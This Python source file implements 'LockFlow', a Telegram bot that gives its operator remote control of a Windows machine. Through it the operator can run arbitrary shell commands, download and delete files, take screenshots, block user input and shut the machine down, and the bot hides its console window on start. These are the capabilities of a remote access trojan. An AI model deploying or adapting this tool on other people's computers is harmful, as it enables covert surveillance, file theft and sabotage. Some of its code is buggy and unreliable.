import os
import mss
import sys
import time
import socket
import ctypes
import shutil
import psutil
import platform
import getpass
import subprocess
from datetime import timedelta
from PIL import Image
from tempfile import NamedTemporaryFile
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Bot Variables
BOT_TOKEN = "BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"
MESSAGE_LENGTH_LIMIT = 2048
CURRENT_DIRECTORY = os.getcwd()

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, 
"""LOCK FLOW HELP\n
HELP:
/help - Lists all commands
/ping - Pong!

STATUS:
/status - Displays status of machine
/diskusage (/du) - Displays disk usage
/ramusage (/ru) - Displays ram usage
/systeminfo (/si) - General system info

TASK MANAGER:
/processes - List currently running processes
/taskkill [pid] - Terminates the specified process

FILE MANAGER:
/ls [path] - Lists directory contents
/cd [path] - Changes directory to specified path
/delete [path] - Deletes file from specified path
/download [path] - Downloads file from specified path

NETWORK:
/networkinfo (/ni) - Basic information about network

REMOTE CONTROL:
/screenshot (/screen) - Takes screenshot of every monitor
/blockinput (/bi) - Block input
/unblockinput (/ubi) - Unblocks input

POWER:
/lock - Locks machine
/sleep - Put's machine to sleep
/restart - Restarts the machine
/hibernate - Triggers hibernation
/shutdown - Shut's down the machine

REMOTE SCRIPTING:
/cmd [command] - Executed given command into command prompt

OTHER:
/exit - Exits the application""")
        except Exception as ex:
            await send_message(update, f"Help Error: {ex}")

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Ping Info: Pong!")
        except Exception as ex:
            await send_message(update, f"Ping Error: {ex}")

# STATUS
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Provides the current status of the system."""
    if UserAuthorized(update.message.chat_id):
        try:
            boot_time_timestamp = psutil.boot_time()
            uptime_seconds = int(psutil.time.time() - boot_time_timestamp)
            uptime = timedelta(seconds=uptime_seconds)  # Convert seconds into timedelta

            # Gather system information
            uptime = str(uptime).split(".")[0]  # Remove microseconds for cleaner output
            current_user = getpass.getuser()
            cpu_usage = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            system = platform.system()
            node = platform.node()
            release = platform.release()

            # Format the message
            status_message = (
                f"SYSTEM STATUS\n\n"
                f"OS: {system} {release}\n"
                f"Hostname: {node}\n"
                f"Uptime: {uptime}\n"
                f"Current User: {current_user}\n"
                f"CPU Usage: {cpu_usage}%\n"
                f"Memory Usage: {memory.percent}% ({memory.used // (1024 ** 2)}MB / {memory.total // (1024 ** 2)}MB)\n"
            )

            # Send status message
            await send_message(update, status_message)
        except Exception as ex:
            await send_message(update, f"Status Error: {ex}")

async def diskusage_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    partitions = psutil.disk_partitions()
    disk_usage_info = []
    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disk_usage_info.append(
                f"Partition: {partition.device}\n"
                f"Mountpoint: {partition.mountpoint}\n"
                f"Total Size: {usage.total // (1024 ** 3)} GB\n"
                f"Used: {usage.used // (1024 ** 3)} GB ({usage.percent}%)\n"
                f"Free: {usage.free // (1024 ** 3)} GB\n\n"
            )
        except PermissionError:
            disk_usage_info.append(f"Partition: {partition.device} - Permission Denied\n\n")

    try:
        await send_message(update, "".join(disk_usage_info))
    except Exception as ex:
        await send_message(update, f"Disk Usage Error: {ex}")

async def ramusage_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    memory = psutil.virtual_memory()
    ram_usage_info = f"Total RAM: {memory.total // (1024 ** 3)} GB\n" + f"Used RAM: {memory.used // (1024 ** 3)} GB ({memory.percent}%)\n" + f"Available RAM: {memory.available // (1024 ** 3)} GB\n"

    try:
        await send_message(update, ram_usage_info)
    except Exception as ex:
        await send_message(update, f"RAM Usage Error: {ex}")

async def systeminfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            # Basic OS info
            system = platform.system()
            release = platform.release()
            version = platform.version()
            architecture = platform.architecture()[0]
            hostname = platform.node()
            current_user = os.getlogin()

            # Format system info message
            system_info = (
                f"SYSTEM INFORMATION\n\n"
                f"OS: {system} {release} (Version: {version})\n"
                f"Architecture: {architecture}\n"
                f"Hostname: {hostname}\n"
                f"Current User: {current_user}\n\n"
                f"Admin Privileges: {ctypes.windll.shell32.IsUserAnAdmin() == 1}\n\n"
            )

            # Send system info message
            await send_message(update, system_info)
        except Exception as ex:
            await send_message(update, f"System Information Error: {ex}")

# TASK MANAGER
async def processes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Lists currently running processes on the system."""
    if UserAuthorized(update.message.chat_id):
        try:
            # Get a list of running processes
            processes = []
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    processes.append(f"PID: {proc.info['pid']} - Name: {proc.info['name']}")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            
            # Format the list
            if processes:
                processes_message = "RUNNING PROCESSES:\n\n" + "\n".join(processes)
                if len(processes) > 50:
                    processes_message += "\n\n[Only showing the first 50 processes.]\n\n"
            else:
                processes_message = "No processes found."
            
            # Send the message
            await send_message(update, processes_message)
        except Exception as ex:
            await send_message(update, f"Processes Error: {ex}")

async def taskkill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Terminates the specified process by its PID."""
    if UserAuthorized(update.message.chat_id):
        try:
            # Check if PID argument is provided
            if len(context.args) == 0:
                await send_message(update, "Usage: /taskkill [pid]")
                return

            # Get the PID from the command arguments
            pid = int(context.args[0])

            # Attempt to terminate the process
            process = psutil.Process(pid)
            process.terminate()
            await send_message(update, f"Successfully terminated process with PID: {pid}")
        except psutil.NoSuchProcess:
            await send_message(update, f"Process with PID {pid} not found.")
        except psutil.AccessDenied:
            await send_message(update, f"Access denied. Unable to terminate process with PID {pid}.")
        except ValueError:
            await send_message(update, "Invalid PID. Please provide a valid process ID.")
        except Exception as ex:
            await send_message(update, f"TaskKill Error: {ex}")

# FILE EXPLORER
async def ls_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Lists files and directories in the current or specified directory.

    Usage: /ls [optional_path]
    """
    if UserAuthorized(update.message.chat_id):
        try:
            path = " ".join(context.args) if context.args else os.getcwd()

            # Handle drive-only paths (e.g., "D:")
            if len(path) == 2 and path[1] == ":":
                path += "\\"

            if not os.path.exists(path):
                await send_message(update, f"Error: Path `{path}` does not exist.")
                return
            if not os.path.isdir(path):
                await send_message(update, f"Error: Path `{path}` is not a directory.")
                return

            # List files and directories
            items = os.listdir(path)
            if items:
                items_message = "\n".join(item for item in items)
            else:
                items_message = "Directory is empty."

            await send_message(update, f"Contents of `{path}`:\n\n{items_message}")
        except Exception as ex:
            await send_message(update, f"LS Error: {str(ex)}")

async def cd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Changes the current working directory, including switching drives.

    Usage: /cd [path]
    """
    if UserAuthorized(update.message.chat_id):
        try:
            if len(context.args) == 0:
                await send_message(update, "Usage: /cd [path]")
                return

            path = " ".join(context.args)

            # Handle drive changes directly
            if len(path) == 2 and path[1] == ":":
                os.chdir(path)  # Switch to the root of the specified drive
                await send_message(update, f"Changed directory to: `{path}\\`")
                return

            # Resolve the absolute path
            new_directory = os.path.abspath(path)

            # Validate the directory
            if not os.path.exists(new_directory):
                await send_message(update, f"Error: Path `{path}` does not exist.")
                return
            if not os.path.isdir(new_directory):
                await send_message(update, f"Error: Path `{path}` is not a directory.")
                return

            # Change the current directory
            os.chdir(new_directory)
            await send_message(update, f"Changed directory to: `{new_directory}`")
        except Exception as ex:
            await send_message(update, f"CD Error: {str(ex)}")

async def delete_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Deletes a specified file or directory.

    Usage: /delete [path]
    """
    if UserAuthorized(update.message.chat_id):
        try:
            # Check if a path is provided
            if len(context.args) == 0:
                await send_message(update, "Usage: /delete [path]")
                return

            # Get the path from the command arguments
            path = " ".join(context.args)
            absolute_path = os.path.abspath(path)

            # Validate the path
            if not os.path.exists(absolute_path):
                await send_message(update, f"Error: Path `{absolute_path}` does not exist.")
                return

            # Prevent accidental deletion of critical system paths (e.g., C:\ or /)
            if absolute_path in [os.path.abspath(os.sep), "C:\\"]:
                await send_message(update, "Error: Deletion of the root directory is not allowed.")
                return

            # Check if it's a file or directory and delete it
            if os.path.isfile(absolute_path):
                os.remove(absolute_path)
                await send_message(update, f"File `{absolute_path}` has been deleted.")
            elif os.path.isdir(absolute_path):
                shutil.rmtree(absolute_path)  # Recursively delete directories
                await send_message(update, f"Directory `{absolute_path}` and its contents have been deleted.")
            else:
                await send_message(update, f"Error: Path `{absolute_path}` is neither a file nor a directory.")
        except Exception as ex:
            await send_message(update, f"Delete Error: {str(ex)}")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            if len(context.args) == 0:
                await send_message(update, "Usage: /download [file_path]")
                return

            # Get the file path from the command arguments
            file_path = " ".join(context.args)

            # Check if the file exists
            if not os.path.exists(file_path):
                await send_message(update, f"Error: File not found at path '{file_path}'.")
                return

            # Check if the path is a file
            if not os.path.isfile(file_path):
                await send_message(update, f"Error: Path '{file_path}' is not a file.")
                return

            # Send the file to the user
            with open(file_path, "rb") as file:
                await update.message.reply_document(file)
        except Exception as ex:
            await send_message(update, f"Download Error: {ex}")

# NETWORK
async def networkinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            # Get hostname and IP address
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            
            # Get network interface information
            network_info = psutil.net_if_addrs()
            network_stats = psutil.net_if_stats()

            interfaces = []
            for interface, addresses in network_info.items():
                if interface in network_stats and network_stats[interface].isup:
                    for addr in addresses:
                        if addr.family == socket.AF_INET:  # IPv4 address
                            interfaces.append(
                                f"{interface}: {addr.address} (Status: {'Up' if network_stats[interface].isup else 'Down'})"
                            )

            # Network speed and latency (via ping)
            ping_result = subprocess.run(
                ["ping", "-c", "1", "8.8.8.8"], capture_output=True, text=True
            )
            latency = "Unknown"
            if ping_result.returncode == 0:
                latency_line = [
                    line for line in ping_result.stdout.split("\n") if "time=" in line
                ]
                if latency_line:
                    latency = latency_line[0].split("time=")[1].split()[0] + " ms"

            # Format message
            network_message = (
                f"NETWORK INFO\n\n"
                f"Hostname: {hostname}\n"
                f"IP Address: {ip_address}\n\n"
                f"Interfaces:\n" + "\n".join(interfaces) + "\n\n"
                f"Latency to Google DNS (8.8.8.8): {latency}\n"
            )

            await send_message(update, network_message)
        except Exception as ex:
            await send_message(update, f"Network Info Error: {ex}")

# REMOTE CONTROL
async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Screenshot Info: Wait...")

            # Take screenshots of all monitors
            with mss.mss() as sct:
                monitors = sct.monitors[1:]  # Ignore monitor[0] (it's a virtual screen)
                screenshots = []
                
                # Capture each monitor
                for monitor in monitors:
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
                    screenshots.append(img)

                # Combine screenshots into one image
                if len(screenshots) > 1:
                    total_width = max(img.width for img in screenshots)
                    total_height = sum(img.height for img in screenshots)
                    combined_img = Image.new("RGB", (total_width, total_height))

                    current_y = 0
                    for img in screenshots:
                        combined_img.paste(img, (0, current_y))
                        current_y += img.height

                    # Save the combined image
                    combined_img.save("screenshot.png")
                else:
                    screenshots[0].save("screenshot.png")

            # Send the screenshot to the user
            await update.message.reply_photo(photo=open("screenshot.png", "rb"))
            os.remove("screenshot.png")

        except Exception as ex:
            await send_message(update, f"Screenshot Error: {ex}")

async def blockinput_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            ctypes.windll.user32.BlockInput(True)
            await send_message(update, f"Block Input Info: Success")
        except Exception as ex:
            await send_message(update, f"Block Input Error: {ex}")

async def unblockinput_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            ctypes.windll.user32.BlockInput(False)
            await send_message(update, f"Unblock Input Info: Success")
        except Exception as ex:
            await send_message(update, f"Unblock Input Error: {ex}")

# POWER
async def lock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Lock Info: Success")
            ctypes.windll.user32.LockWorkStation()
        except Exception as ex:
            await send_message(update, f"Lock Error: {ex}")

async def sleep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Sleep Info: Success")
            ctypes.windll.PowrProf.SetSuspendState(False, True, False)
        except Exception as ex:
            await send_message(update, f"Sleep Error: {ex}")

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Restart Info: Success")
            os.system("shutdown /r /t 0")
        except Exception as ex:
            await send_message(update, f"Restart Error: {ex}")

async def hibernate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Hibernate Info: Success")
            ctypes.windll.PowrProf.SetSuspendState(True, True, False)
        except Exception as ex:
            await send_message(update, f"Hibernate Error: {ex}")

async def shutdown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            await send_message(update, f"Shutdown Info: Success")
            os.system("shutdown /s /t 0")
        except Exception as ex:
            await send_message(update, f"Shutdown Error: {ex}")

# REMOTE SCRIPTING
async def cmd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            command = " ".join(context.args)
            if command:
                try:
                    # Run the command in the system's Command Prompt
                    result = subprocess.run(command, capture_output=True, shell=True, text=True)
                    
                    # Send the output back to the user
                    if result.stdout:
                        await send_message(update, f"CMD Output:\n{result.stdout}")
                    if result.stderr:
                        await send_message(update, f"CMD Error:\n{result.stderr}")
                except Exception as e:
                    await send_message(update, f"CMD Error: {e}")
            else:
                await send_message(update, "CMD Info: Please provide a command to execute. Usage: /cmd <args>")
        except Exception as ex:
            await send_message(update, f"CMD Error: {ex}")

# OTHER
async def exit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if UserAuthorized(update.message.chat_id):
        try:
            sys.exit(0)
        except Exception as ex:
            await send_message(update, f"Exit Error: {ex}")

# HELPER
async def send_message(update: Update, message: str):
    try:
        # Check if the message length exceeds the limit
        if len(message) <= MESSAGE_LENGTH_LIMIT:
            await update.message.reply_text(message)
        else:
            with NamedTemporaryFile(delete=False, mode="w", suffix=".txt") as temp_file:
                temp_file.write(message)
                temp_file_path = temp_file.name
            
            # Send the file using a helper function
            await send_file(update, temp_file_path)

            # Remove the temporary file after sending
            os.remove(temp_file_path)
    except Exception as ex:
        print(f"Failed to send message: {ex}")

async def send_file(update: Update, file_path: str):
    try:
        # Send the file to the user
        with open(file_path, "rb") as file:
            await update.message.reply_document(file)
    except Exception as ex:
        send_message(update, f"Failed to send file: {ex}", parse_mode="Markdown")

# Check if user is authorized
def UserAuthorized(chatID):
    if str(chatID) == CHAT_ID:
        return True
    else:
        return False

def main():
    if BOT_TOKEN == "BOT_TOKEN_HERE":
        print("Please change BOT_TOKEN variable")
        return

    # Create the bot application
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # Register command handlers
    # HELP
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("ping", ping_command))
    
    # STATUS
    application.add_handler(CommandHandler("status", status_command))

    application.add_handler(CommandHandler("diskusage", diskusage_command))
    application.add_handler(CommandHandler("du", diskusage_command))  # Alias of "diskusage"

    application.add_handler(CommandHandler("ramusage", ramusage_command))
    application.add_handler(CommandHandler("ru", ramusage_command))  # Alias of "ramusage"

    application.add_handler(CommandHandler("systeminfo", systeminfo_command))
    application.add_handler(CommandHandler("si", systeminfo_command))  # Alias of "ramusage"

    # TASK MANAGER
    application.add_handler(CommandHandler("processes", processes_command))
    application.add_handler(CommandHandler("taskkill", taskkill_command))

    # FILE MANAGER
    application.add_handler(CommandHandler("ls", ls_command))
    application.add_handler(CommandHandler("cd", cd_command))
    application.add_handler(CommandHandler("delete", delete_command))
    #application.add_handler(CommandHandler("upload", upload_command))
    application.add_handler(CommandHandler("download", download_command))
    #application.add_handler(CommandHandler("ftp", ftp_command))

    # NETWORK
    application.add_handler(CommandHandler("networkinfo", networkinfo_command))
    application.add_handler(CommandHandler("ni", networkinfo_command))  # Alias of "networkinfo"

    # REMOTE CONTROL
    application.add_handler(CommandHandler("screenshot", screenshot_command))
    application.add_handler(CommandHandler("screen", screenshot_command))  # Alias of "screenshot"

    application.add_handler(CommandHandler("blockinput", blockinput_command))
    application.add_handler(CommandHandler("bi", blockinput_command))  # Alias of "blockinput"

    application.add_handler(CommandHandler("unblockinput", unblockinput_command))
    application.add_handler(CommandHandler("ubi", unblockinput_command))  # Alias of "unblockinput"

    #application.add_handler(CommandHandler("message", message_command))

    # POWER
    application.add_handler(CommandHandler("lock", lock_command))
    application.add_handler(CommandHandler("sleep", sleep_command))
    application.add_handler(CommandHandler("restart", restart_command))
    application.add_handler(CommandHandler("hibernate", hibernate_command))
    application.add_handler(CommandHandler("shutdown", shutdown_command))

    # REMOTE SCRIPTING
    application.add_handler(CommandHandler("cmd", cmd_command))

    # OTHER
    application.add_handler(CommandHandler("exit", exit_command))

    # Run the bot with automatic reconnect
    while True:
        try:
            print("LockFlow Info: Starting...")
            application.run_polling()
        except Exception as ex:
            print(f"LockFlow Error: {ex}")
            time.sleep(5)

if __name__ == "__main__":
    # Hide's console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
